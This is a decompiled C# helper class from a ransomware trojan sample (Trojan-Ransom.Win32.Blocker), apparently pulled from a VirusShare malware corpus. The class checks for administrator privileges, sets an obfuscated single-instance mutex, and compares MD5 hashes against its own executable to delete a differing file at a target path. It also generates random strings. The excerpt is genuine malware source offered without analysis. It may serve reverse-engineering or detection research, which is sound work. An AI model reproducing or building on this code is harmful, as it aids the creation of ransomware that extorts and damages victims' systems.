// Decompiled with JetBrains decompiler
// Type: _2012.x0_fnc
// Assembly: 2012, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F5694FB0-D176-4C80-83D0-71B8F6A2BF06
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.cmxi-ac38440cdaaa0a8f08255d957aa7b8a4bfc2438b.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Threading;

namespace _2012
{
  internal class x0_fnc
  {
    [DllImport("kernel32.dll")]
    public static extern int SetProcessWorkingSetSize(
      IntPtr process,
      int minimumWorkingSetSize,
      int maximumWorkingSetSize);

    public static void Flush()
    {
      GC.Collect();
      GC.WaitForPendingFinalizers();
      if (Environment.OSVersion.Platform != PlatformID.Win32NT)
        return;
      x0_fnc.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1);
    }

    public static bool fnc_admin()
    {
      try
      {
        return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
      }
      catch
      {
        return false;
      }
    }

    public static bool checkFile(string FilePath)
    {
      if (!File.Exists(FilePath))
        return false;
      if (!(x0_fnc.FileMD5(FilePath) != x0_fnc.FileMD5(Process.GetCurrentProcess().MainModule.FileName)))
        return true;
      File.SetAttributes(FilePath, FileAttributes.Normal);
      File.Delete(FilePath);
      return false;
    }

    private static string FileMD5(string op654654kl454lk54lk648)
    {
      FileStream inputStream = File.OpenRead(op654654kl454lk54lk648);
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash((Stream) inputStream);
      inputStream.Close();
      return BitConverter.ToString(hash).Replace("-", "").ToUpper();
    }

    public static string gstring(int len)
    {
      Random random = new Random();
      string str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
      string empty = string.Empty;
      for (int index = 0; index < len; ++index)
        empty += str.Substring(random.Next(0, str.Length), 1);
      return empty;
    }

    public static void cxmux()
    {
      try
      {
        x0_str.xmux = new Mutex(true, "777e7e7e7e7d5f44d6s4d6764537463576df4f5486736544654f68d7f6sa666a6a4sa6d48384364f52f");
        x0_str.xmux.ReleaseMutex();
      }
      catch
      {
        Console.WriteLine("Mutex");
        Environment.Exit(-1);
      }
    }
  }
}
